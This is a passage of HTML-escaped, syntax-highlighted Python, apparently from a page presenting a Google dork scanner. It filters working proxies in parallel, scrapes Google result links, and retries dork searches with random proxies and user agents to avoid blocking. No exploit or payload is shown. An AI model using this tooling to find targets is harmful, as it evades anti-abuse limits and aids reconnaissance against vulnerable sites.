&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exceptions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProxyError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Proxy error for proxy: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;red&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exceptions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RequestException&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Request exception for proxy: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, error: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;red&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;filter_working_proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;working_proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;choice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;max_workers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;futures_to_proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;executor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test_proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;future&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_completed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;futures_to_proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;future&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;working_proxies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;futures_to_proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;future&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;working_proxies&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;useragents.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;google_search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://www.google.com/search?q=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;soup&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BeautifulSoup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;html.parser&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;href&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;soup&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.yuRUbf a&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;search_dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;max_retries&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;backoff_factor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Searching for dork: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;yellow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;try_search_dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;google_search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exceptions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RequestException&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error with proxy &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, rotating proxy...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;magenta&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;retries&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;retries&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;max_retries&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;choice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;choice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
